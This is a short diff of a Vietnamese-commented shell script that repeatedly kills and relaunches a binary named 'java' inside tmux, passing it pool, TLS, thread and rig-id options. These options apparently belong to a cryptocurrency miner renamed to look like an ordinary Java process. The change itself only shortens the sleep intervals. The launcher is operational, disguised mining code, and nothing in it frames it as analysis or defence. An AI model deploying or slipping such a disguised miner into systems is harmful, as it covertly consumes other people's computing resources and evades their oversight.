@@ -36,7 +36,7 @@ echo "[+] Vòng lặp ..."
 while true; do
     pkill -f "$(pwd)/java/java" 2>/dev/null
     echo "[+] Kill process - sleep 5s..."
-    sleep 10
+    sleep 5
 
     tmux kill-session -t $SESSION 2>/dev/null
     echo "[+] run process - sleep 5 phút..."
@@ -45,5 +45,5 @@ while true; do
         $(pwd)/java/java -o $DOMAIN --tls -k -t 7 --rig-id $NAME_WORK
     " C-m
 
-    sleep 150
+    sleep 120
 done
